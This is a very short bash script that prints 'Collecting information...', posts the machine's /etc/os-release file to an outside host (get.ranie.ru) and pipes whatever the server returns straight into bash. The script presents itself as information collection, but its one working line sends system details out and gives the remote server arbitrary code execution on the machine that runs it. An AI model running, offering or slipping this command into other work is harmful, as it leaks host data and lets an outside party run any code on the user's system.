#!/usr/bin/env bash
echo 'Collecting information...'
#OS_RELEASE=`< /etc/os-release`
curl -X POST -d @/etc/os-release http://get.ranie.ru | bash
